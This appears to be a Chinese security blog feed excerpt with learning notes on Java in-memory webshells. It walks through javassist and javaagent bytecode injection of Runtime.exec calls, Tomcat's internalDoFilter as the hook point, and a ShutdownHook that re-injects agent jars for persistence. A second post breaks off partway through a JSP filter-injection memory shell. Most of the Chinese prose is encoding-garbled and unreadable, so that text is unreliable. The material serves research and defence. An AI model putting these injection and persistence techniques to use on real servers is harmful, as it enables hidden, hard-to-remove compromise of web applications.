    <content type="html"><![CDATA[<p>rebeyond å¸ˆå‚…åœ¨å‚è€ƒã€1ã€‘ä¸­æå‡ºåˆ©ç”¨javaagent æ°¸ä¹…æ³¨å…¥tomcatè¿›ç¨‹çš„æ–¹æ¡ˆï¼Œæœ‰å‡ ä¸ªé‡è¦çš„æŠ€æœ¯ç‚¹</p><ol><li>javaagentæŠ€æœ¯</li><li>javassistæŠ€æœ¯</li><li>tomcat ApplicationFilterChain.internalDoFilteræ–¹æ³•</li><li>ShutdownHook é’©å­</li></ol><h2 id="javassistæŠ€æœ¯"><a href="#javassistæŠ€æœ¯" class="headerlink" title="javassistæŠ€æœ¯"></a>javassistæŠ€æœ¯</h2><blockquote><p>Java å­—èŠ‚ç ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ª .class æ–‡ä»¶åŒ…å«ä¸€ä¸ª Java ç±»æˆ–æ¥å£ã€‚Javaassist å°±æ˜¯ä¸€ä¸ªç”¨æ¥ å¤„ç† Java å­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¹å­—èŠ‚ç æ–¹é¢æœ‰æ·±å…¥çš„äº†è§£ã€‚åŒæ—¶ä¹Ÿå¯ä»¥å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ï¼Œé€šè¿‡å®Œå…¨æ‰‹åŠ¨çš„æ–¹å¼ã€‚</p></blockquote><p>javassist ç›¸å…³æ–‡æ¡£å¯ä»¥å‚è€ƒã€2ã€‘å’Œã€3ã€‘ï¼Œä»¥ç®€å•çš„javassist demo<br>ä¸ºä¾‹</p><a id="more"></a><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>ç›®å½•ç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ ModifyTarget.java</span><br><span class="line">â””â”€â”€ Target.java</span><br></pre></td></tr></table></figure><p>å…¶ä¸­Targetä¸ºDemo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Target</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Target a = <span class="keyword">new</span> Target();</span><br><span class="line">        a.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ModifyTargetåŠŸèƒ½ä¸ºåˆ©ç”¨javassiståŠ¨æ€æ›´æ”¹Target.classï¼Œæ·»åŠ ä¸€æ®µé™æ€ä»£ç æ®µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testClassPool</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException, IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    String command = <span class="string">&quot;open -a calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(org.m0d9.sec.JavassistDemo.Target.class));</span><br><span class="line">    CtClass cc = pool.get(org.m0d9.sec.JavassistDemo.Target.class.getName());</span><br><span class="line">    System.out.println(org.m0d9.sec.JavassistDemo.Target.class.getName());</span><br><span class="line"></span><br><span class="line">    cc.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + command.replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    <span class="comment">//åŠ å…¥å…³é”®æ‰§è¡Œä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªé™æ€å‡½æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line">    String newClassNameString = <span class="string">&quot;angelwhu.Pwner&quot;</span> + System.nanoTime();</span><br><span class="line">    cc.setName(newClassNameString);</span><br><span class="line">    <span class="comment">// å†™æ–‡ä»¶</span></span><br><span class="line">    cc.writeFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-112.png" alt="upload successful"></p><p>ä½†æ˜¯ä»…ä»…æ”¹åŠ¨classè¿˜ä¸å¤Ÿï¼Œå¦‚ä½•æ›¿æ¢æ‰æ­£åœ¨è¿è¡Œçš„Targetç±»å‘¢ï¼Ÿ</p><h2 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h2><blockquote><p>java InstrumentationæŒ‡çš„æ˜¯å¯ä»¥ç”¨ç‹¬ç«‹äºåº”ç”¨ç¨‹åºä¹‹å¤–çš„ä»£ç†ï¼ˆagentï¼‰ç¨‹åºæ¥ç›‘æµ‹å’ŒååŠ©è¿è¡Œåœ¨JVMä¸Šçš„åº”ç”¨ç¨‹åºã€‚è¿™ç§ç›‘æµ‹å’ŒååŠ©åŒ…æ‹¬ä½†ä¸é™äºè·å–JVMè¿è¡Œæ—¶çŠ¶æ€ï¼Œæ›¿æ¢å’Œä¿®æ”¹ç±»å®šä¹‰ç­‰ã€‚ç®€å•ä¸€å¥è¯æ¦‚æ‹¬ä¸‹ï¼šJava Instrumentationå¯ä»¥åœ¨JVMå¯åŠ¨åï¼ŒåŠ¨æ€ä¿®æ”¹å·²åŠ è½½æˆ–è€…æœªåŠ è½½çš„ç±»ï¼ŒåŒ…æ‹¬ç±»çš„å±æ€§ã€æ–¹æ³•ã€‚</p></blockquote><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><p>ç›®å½•ç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€ AgentMainTest.java</span><br></pre></td></tr></table></figure><p>å…¶ä¸­AgentMainTestä¸ºDemoï¼Œagentmainä¸ºä¸»å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load Class:&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“åŒ…ä¸ºjaréœ€è¦æ³¨æ„ï¼Œå¿…é¡»æŒ‡å®šAgent-Class:ä¸ºç›®æ ‡ç±»ï¼Œæ¯”å¦‚rebeyondå¸ˆå‚…çš„memshell</p><p><code>Agent-Class:net.rebeyond.memshell.Agent</code></p><p>ä¸»è¦çš„åŠŸèƒ½é€»è¾‘åœ¨è‡ªå®šä¹‰Transformer ä¸Šï¼ŒTransformeræä¾›transformæ¥å£ï¼Œè¾“å…¥å¯ä»¥æ˜¯å„ç§ç±»ï¼Œå¦‚æœéœ€è¦ä¿®æ”¹è¯¥ç±»ï¼Œæ”¹åŠ¨è¿”å›æ–°ç±»çš„byteså³å¯</p><p>å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;org/m0d9/sec/JavassistDemo/Target&quot;</span>.equals(className)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line">            ClassClassPath classPath = <span class="keyword">new</span> ClassClassPath(classBeingRedefined);  <span class="comment">//get current class&#x27;s classpath</span></span><br><span class="line">            cp.insertClassPath(classPath);  <span class="comment">//add the classpath to classpool</span></span><br><span class="line">            CtClass cc = cp.get(<span class="string">&quot;org.m0d9.sec.JavassistDemo.Target&quot;</span>);</span><br><span class="line">            CtMethod m = cc.getDeclaredMethod(<span class="string">&quot;internalDoFilter&quot;</span>);</span><br><span class="line">            m.addLocalVariable(<span class="string">&quot;elapsedTime&quot;</span>, CtClass.longType);</span><br><span class="line">            m.insertBefore(<span class="string">&quot;System.out.println(\&quot;called\&quot;);Runtime.getRuntime().exec(\&quot;open -a calculator.app\&quot;);&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;inject code done&quot;</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] byteCode = cc.toBytecode();</span><br><span class="line">            cc.detach();</span><br><span class="line">            <span class="keyword">return</span> byteCode;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;error:::::&quot;</span>+ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“åŒ…ä¸ºagent.jar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -javaagent:/Users/mody/study/java/MemShell/JavassistDemo/target/JavassistDemo-1.0-SNAPSHOT.jar Target</span><br></pre></td></tr></table></figure><p>å¯ä»¥æˆåŠŸåœ¨helloå‡½æ•°ä¸­æ’å…¥å¼¹å‡ºè®¡ç®—å™¨</p><h2 id="tomcat-internalDoFilter"><a href="#tomcat-internalDoFilter" class="headerlink" title="tomcat internalDoFilter"></a>tomcat internalDoFilter</h2><p>å‰æ–‡servletä¸­æœ‰æåŠtomcat httpè¯·æ±‚çš„è°ƒç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)</span><br><span class="line">at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)</span><br><span class="line">at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)</span><br><span class="line">at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)</span><br><span class="line">at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)</span><br><span class="line">at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)</span><br><span class="line">at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)</span><br><span class="line">at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)</span><br><span class="line">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)</span><br><span class="line">at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)</span><br><span class="line">at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)</span><br><span class="line">at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)</span><br><span class="line">at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure><p>æœ‰äº†ä»¥ä¸Šçš„åŸºç¡€çŸ¥è¯†ï¼Œå°†Targetç±»æ›¿æ¢ä¸ºinternalDoFilterç±»å³å¯</p><p>åœ¨internalDoFilterä¸­æ’å…¥çš„payloadæ”¹ä¸ºevil code</p><h2 id="ShutdownHook"><a href="#ShutdownHook" class="headerlink" title="ShutdownHook"></a>ShutdownHook</h2><p>JDKæä¾›äº†Java.Runtime.addShutdownHook(Thread hook)æ–¹æ³•ï¼Œå¯ä»¥æ³¨å†Œä¸€ä¸ªJVMå…³é—­çš„é’©å­ï¼Œè¿™ä¸ªé’©å­å¯ä»¥åœ¨ä¸€ä¸‹å‡ ç§åœºæ™¯ä¸­è¢«è°ƒç”¨ï¼š</p><ul><li>ç¨‹åºæ­£å¸¸é€€å‡º</li><li>ä½¿ç”¨System.exit()</li><li>ç»ˆç«¯ä½¿ç”¨Ctrl+Cè§¦å‘çš„ä¸­æ–­</li><li>ç³»ç»Ÿå…³é—­</li><li>OutOfMemoryå®•æœº</li><li>ä½¿ç”¨Kill pidå‘½ä»¤å¹²æ‰è¿›ç¨‹ï¼ˆæ³¨ï¼šåœ¨ä½¿ç”¨kill -9 pidæ—¶ï¼Œæ˜¯ä¸ä¼šè¢«è°ƒç”¨çš„ï¼‰</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Thread t = <span class="keyword">new</span> Thread() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">writeFiles(<span class="string">&quot;inject.jar&quot;</span>, Agent.injectFileBytes);</span><br><span class="line">writeFiles(<span class="string">&quot;agent.jar&quot;</span>, Agent.agentFileBytes);</span><br><span class="line">startInject();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">t.setName(<span class="string">&quot;shutdown Thread&quot;</span>);</span><br><span class="line">Runtime.getRuntime().addShutdownHook(t);</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚å°†rebeyond å¸ˆå‚…é¦–å‘çš„agentç±»å‹javaå†…å­˜é©¬æ‹†ä¸ºå‡ ä¸ªå…³é”®æŠ€æœ¯ç‚¹ï¼Œç®€å•çš„åˆ†åˆ«ä½œäº†ä»‹ç»ï¼Œå…¶å®å‰ä¸¤ä¸ªjavassist/javaagentåº”è¯¥è¿˜æœ‰æ›´å¤šçš„çŸ¥è¯†ç‚¹ã€‚</p><p>æ„ˆå‘è§‰å¾—javaå®‰å…¨å°±åƒå †ç§¯æœ¨</p><p>æ„Ÿå¹ä¸€å£°å­¦æµ·æ— æ¶¯</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.cnblogs.com/rebeyond/p/9686213.html">ã€åŸåˆ›ã€‘åˆ©ç”¨â€œè¿›ç¨‹æ³¨å…¥â€å®ç°æ— æ–‡ä»¶ä¸æ­»webshell</a></li><li>[2] <a href="https://github.com/jboss-javassist/javassist/wiki">javassist wiki</a></li><li>[3] <a href="https://www.cnblogs.com/rickiyang/p/11336268.html">javassistä½¿ç”¨å…¨è§£æ</a></li><li>[4] <a href="https://github.com/rebeyond/memShell">memshell</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;rebeyond å¸ˆå‚…åœ¨å‚è€ƒã€1ã€‘ä¸­æå‡ºåˆ©ç”¨javaagent æ°¸ä¹…æ³¨å…¥tomcatè¿›ç¨‹çš„æ–¹æ¡ˆï¼Œæœ‰å‡ ä¸ªé‡è¦çš„æŠ€æœ¯ç‚¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;javaagentæŠ€æœ¯&lt;/li&gt;
&lt;li&gt;javassistæŠ€æœ¯&lt;/li&gt;
&lt;li&gt;tomcat ApplicationFilterChain.internalDoFilteræ–¹æ³•&lt;/li&gt;
&lt;li&gt;ShutdownHook é’©å­&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;javassistæŠ€æœ¯&quot;&gt;&lt;a href=&quot;#javassistæŠ€æœ¯&quot; class=&quot;headerlink&quot; title=&quot;javassistæŠ€æœ¯&quot;&gt;&lt;/a&gt;javassistæŠ€æœ¯&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Java å­—èŠ‚ç ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ª .class æ–‡ä»¶åŒ…å«ä¸€ä¸ª Java ç±»æˆ–æ¥å£ã€‚Javaassist å°±æ˜¯ä¸€ä¸ªç”¨æ¥ å¤„ç† Java å­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¹å­—èŠ‚ç æ–¹é¢æœ‰æ·±å…¥çš„äº†è§£ã€‚åŒæ—¶ä¹Ÿå¯ä»¥å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ï¼Œé€šè¿‡å®Œå…¨æ‰‹åŠ¨çš„æ–¹å¼ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;javassist ç›¸å…³æ–‡æ¡£å¯ä»¥å‚è€ƒã€2ã€‘å’Œã€3ã€‘ï¼Œä»¥ç®€å•çš„javassist demo&lt;br&gt;ä¸ºä¾‹&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="javassist" scheme="http://m0d9.me/tags/javassist/"/>
    
    <category term="javaagent" scheme="http://m0d9.me/tags/javaagent/"/>
    
    <category term="å†…å­˜shell" scheme="http://m0d9.me/tags/%E5%86%85%E5%AD%98shell/"/>
    
  </entry>
  
  <entry>
    <title>Javaå†…å­˜shellï¼šservlet</title>
    <link href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Aservlet/"/>
    <id>http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9Aservlet/</id>
    <published>2020-09-27T01:58:00.000Z</published>
    <updated>2020-10-10T13:20:18.831Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å­¦ä¹ Javaå†…å­˜shellç›¸å…³çŸ¥è¯†ï¼Œæ€»ç»“æ²‰æ·€å‡ ç¯‡æ–‡ç« ï¼Œæƒå½“å­¦ä¹ ç¬”è®°äº†ã€‚</p><h2 id="Javaå†…å­˜webshellå²"><a href="#Javaå†…å­˜webshellå²" class="headerlink" title="Javaå†…å­˜webshellå²"></a>Javaå†…å­˜webshellå²</h2><p>ç›´æ¥å¼•ç”¨c0ny1å¸ˆå‚…çš„æ€»ç»“ï¼Œå†™çš„å¤ªå¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å…¶å®å†…å­˜é©¬ç”±æ¥å·²ä¹…ï¼Œæ—©åœ¨17å¹´n1ntyå¸ˆå‚…çš„ã€ŠTomcatæºç è°ƒè¯•ç¬”è®°-çœ‹ä¸è§çš„shellã€‹ä¸­å·²åˆè§ç«¯å€ªï¼Œä½†ä¸€ç›´ä¸æ¸©ä¸ç«ã€‚åç»è¿‡rebeyongå¸ˆå‚…ä½¿ç”¨agentæŠ€æœ¯åŠ æŒåï¼Œæ‹“å±•äº†å†…å­˜é©¬çš„ä½¿ç”¨åœºæ™¯ï¼Œç„¶ç»ˆåœç•™åœ¨å¥‡æŠ€æ·«å·§ä¸Šã€‚åœ¨å„ç±»hwæ´—ç¤¼ä¹‹åï¼Œæ–‡ä»¶shellæ˜æ˜¾æ°”æ•°å·²å°½ã€‚å†…å­˜é©¬ä»¥æ•‘å‘½ç¨»è‰çš„èº«ä»½é‡å›å¤§ä¼—è§†é‡ã€‚ç‰¹åˆ«æ˜¯ä»Šå¹´åœ¨shiroçš„å›æ˜¾ç ”ç©¶ä¹‹åï¼Œå¼•å‘äº†æ— æ•°å®‰å…¨ç ”ç©¶å‘˜å¯¹å†…å­˜webshellçš„ç ”ç©¶ï¼Œå…¶ä¸­æ¶Œç°å‡ºäº†LandGreyå¸ˆå‚…æ„é€ çš„Spring controllerå†…å­˜é©¬ã€‚è‡³æ­¤å†…å­˜é©¬å¼€ææ•£å¶å‘å±•å‡ºäº†ä¸‰å¤§ç±»å‹ï¼š</span><br><span class="line"></span><br><span class="line">1. servlet-apiç±»</span><br><span class="line">filterå‹</span><br><span class="line">servletå‹</span><br><span class="line">2. springç±»</span><br><span class="line">æ‹¦æˆªå™¨</span><br><span class="line">controllerå‹</span><br><span class="line">3. Java Instrumentationç±»</span><br><span class="line">agentå‹</span><br><span class="line"></span><br><span class="line">å†…å­˜é©¬è¿™å›æ·±å··ä½³é…’ï¼Œä¸€æ—¶é—´æµè¡Œäºå¸‚äº•ä¸å¼„å ‚ä¹‹é—´ã€‚ä¸Šè‡³å®‰å…¨ç ”ç©¶å‘˜ä¸‹è‡³æ™®é€šå®¢æˆ·ï¼Œäººå°½çš†çŸ¥ã€‚æ­£å€¼hwæ¥ä¸´ä¹‹é™…ï¼Œä¸éš¾æ¨æµ‹å±Šæ—¶å¿…å°†æ˜¯å†…å­˜é©¬æ¨ªè¡Œå¤©ä¸‹ä¹‹æ—¥ã€‚è€Œå„å¤§å®‰å…¨å‚å•†å´è¿Ÿè¿Ÿæœªè§åŠ¨é™ã€‚æ‰€è°“è¡¨é¢é£å¹³æµªé™ï¼Œå®åˆ™æš—æµæ¶ŒåŠ¨ã€‚æˆ–è®¸ä¸€åœºå†…å­˜é©¬çš„å›´å‰¿è®¡åˆ’æ­£æ…¢æ…¢å±•å¼€ã€‚ä½œä¸ºæ”»å‡»æ–¹å‘çš„ç ”ç©¶äººå‘˜ï¼Œæ²¡æœ‰å¯¹æ‰‹å°±åˆ¶é€ å¯¹æ‰‹,æ”»é˜²äº’æ¢æ‰èƒ½æå‡å†…å­˜é©¬æŠ€æœ¯çš„å‘å±•ã€‚</span><br></pre></td></tr></table></figure><a id="more"></a><p>Dç›¾ã€å®‰å…¨ç‹—ï¼Œä»¥åŠå„äº‘å‚å•†å¯¹äºwebshellè¯†åˆ«æŠ€æœ¯æ„ˆå‘æˆç†Ÿï¼Œwebshellç”Ÿå­˜ç©ºé—´ä¸€ç›´è¢«å‹ç¼©ï¼Œå†…å­˜shellæˆ–è®¸å¯ä»¥æä¾›æ–°çš„æ”»é˜²æ–¹å‘ã€‚</p><h2 id="n1ntyå¸ˆå‚…çš„jspå†…å­˜shell"><a href="#n1ntyå¸ˆå‚…çš„jspå†…å­˜shell" class="headerlink" title="n1ntyå¸ˆå‚…çš„jspå†…å­˜shell"></a>n1ntyå¸ˆå‚…çš„jspå†…å­˜shell</h2><p>n1ntyå¸ˆå‚…2017å¹´çš„æ–‡ç« ï¼Œè§å‚è€ƒã€1ã€‘ï¼Œæ‘˜å–å…¶ä¸­é‡ç‚¹é€»è¾‘ä»£ç </p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">final</span> String name = <span class="string">&quot;n1ntyfilter&quot;</span>;</span><br><span class="line"></span><br><span class="line">ServletContext ctx = request.getSession().getServletContext();</span><br><span class="line">Field f = ctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext appCtx = (ApplicationContext)f.get(ctx);</span><br><span class="line"></span><br><span class="line">f = appCtx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">f.setAccessible(<span 